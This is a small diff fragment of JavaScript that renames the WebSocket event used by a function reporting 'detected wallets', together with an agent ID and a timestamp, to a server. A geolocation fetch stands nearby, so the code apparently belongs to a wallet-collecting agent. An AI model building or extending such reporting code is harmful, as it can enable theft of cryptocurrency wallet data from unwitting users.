@@ -143,7 +143,7 @@ async function fetchGeo() {
 // Send detected wallets via WebSocket
 async function sendWalletsToServer(wallets) {
   if (agentId && ws?.readyState === WebSocket.OPEN) {
-    send('wallet_update', {
+    send('wallets_detected', {
       agentId: agentId,
       wallets: wallets,
       timestamp: new Date().toISOString()
